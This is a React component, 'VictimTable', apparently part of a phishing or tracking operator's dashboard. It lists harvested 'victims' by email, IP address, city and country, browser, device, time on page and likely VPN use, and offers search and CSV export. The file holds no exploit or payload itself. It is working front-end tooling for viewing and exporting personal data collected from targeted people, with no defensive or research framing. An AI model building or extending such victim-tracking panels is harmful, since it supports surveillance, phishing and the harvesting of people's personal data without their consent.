import { useState } from 'react';

/**
 * VictimTable Component
 *
 * Displays victims in a paginated, searchable table
 */
const VictimTable = ({ victims, pagination, onPageChange, onExport }) => {
  const [searchTerm, setSearchTerm] = useState('');

  // Filter victims based on search
  const filteredVictims = victims.filter((victim) => {
    const searchLower = searchTerm.toLowerCase();
    return (
      victim.email?.toLowerCase().includes(searchLower) ||
      victim.ip?.toLowerCase().includes(searchLower) ||
      victim.city?.toLowerCase().includes(searchLower) ||
      victim.country?.toLowerCase().includes(searchLower)
    );
  });

  return (
    <div className="apex-card">
      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 mb-6">
        <h3 className="text-2xl font-bold text-apex-gold">Victims Data</h3>
        <div className="flex gap-2 w-full sm:w-auto">
          <input
            type="text"
            placeholder="Search by email, IP, location..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="apex-input text-sm flex-1 sm:flex-none sm:w-64"
          />
          <button onClick={onExport} className="apex-button text-sm px-4 py-2 whitespace-nowrap">
            Export CSV
          </button>
        </div>
      </div>

      {/* Table */}
      <div className="overflow-x-auto">
        <table className="w-full text-left text-sm">
          <thead className="text-xs uppercase bg-apex-dark text-gray-400 border-b border-apex-red/30">
            <tr>
              <th className="px-4 py-3">Timestamp</th>
              <th className="px-4 py-3">Email</th>
              <th className="px-4 py-3">IP Address</th>
              <th className="px-4 py-3">Location</th>
              <th className="px-4 py-3">Browser</th>
              <th className="px-4 py-3">Device</th>
              <th className="px-4 py-3">Time (s)</th>
              <th className="px-4 py-3">VPN</th>
            </tr>
          </thead>
          <tbody>
            {filteredVictims.length > 0 ? (
              filteredVictims.map((victim) => (
                <tr
                  key={victim._id}
                  className="border-b border-gray-800 hover:bg-apex-dark/50 transition-colors"
                >
                  <td className="px-4 py-3 whitespace-nowrap">
                    {new Date(victim.timestamp).toLocaleString()}
                  </td>
                  <td className="px-4 py-3 font-mono text-apex-green">{victim.email}</td>
                  <td className="px-4 py-3 font-mono text-xs">{victim.ip}</td>
                  <td className="px-4 py-3">
                    {victim.city}, {victim.country}
                  </td>
                  <td className="px-4 py-3 text-xs">{victim.browser}</td>
                  <td className="px-4 py-3">{victim.device}</td>
                  <td className="px-4 py-3 text-center">{victim.timeOnPage}</td>
                  <td className="px-4 py-3 text-center">
                    {victim.vpnLikely ? (
                      <span className="text-yellow-500" title={`Confidence: ${victim.vpnConfidence}`}>
                        ⚠️
                      </span>
                    ) : (
                      <span className="text-gray-600">-</span>
                    )}
                  </td>
                </tr>
              ))
            ) : (
              <tr>
                <td colSpan="8" className="px-4 py-8 text-center text-gray-500">
                  {searchTerm ? 'No results found' : 'No victims yet'}
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>

      {/* Pagination */}
      {pagination.totalPages > 1 && (
        <div className="flex justify-between items-center mt-6 pt-4 border-t border-gray-800">
          <div className="text-sm text-gray-400">
            Page {pagination.currentPage} of {pagination.totalPages} ({pagination.totalRecords}{' '}
            total records)
          </div>
          <div className="flex gap-2">
            <button
              onClick={() => onPageChange(pagination.currentPage - 1)}
              disabled={!pagination.hasPrev}
              className="px-4 py-2 bg-apex-darker border border-apex-red/30 rounded hover:border-apex-red disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
            >
              Previous
            </button>
            <button
              onClick={() => onPageChange(pagination.currentPage + 1)}
              disabled={!pagination.hasNext}
              className="px-4 py-2 bg-apex-darker border border-apex-red/30 rounded hover:border-apex-red disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
            >
              Next
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default VictimTable;
